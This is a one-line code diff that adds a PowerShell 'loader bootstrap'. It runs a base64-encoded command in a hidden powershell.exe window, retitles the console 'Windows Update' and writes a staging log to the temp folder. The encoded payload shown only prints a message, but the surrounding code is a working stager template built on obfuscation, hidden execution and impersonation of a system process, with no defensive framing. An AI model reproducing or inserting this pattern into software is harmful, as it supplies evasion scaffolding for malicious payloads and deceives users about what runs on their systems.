@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $EncodedBlob = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHMAdABhAGcAZQAgAHIAZQBhAGQAeQAiAA=="; Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoP -EncodedCommand " + $EncodedBlob) -WindowStyle Hidden; $Host.UI.RawUI.WindowTitle = "Windows Update"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
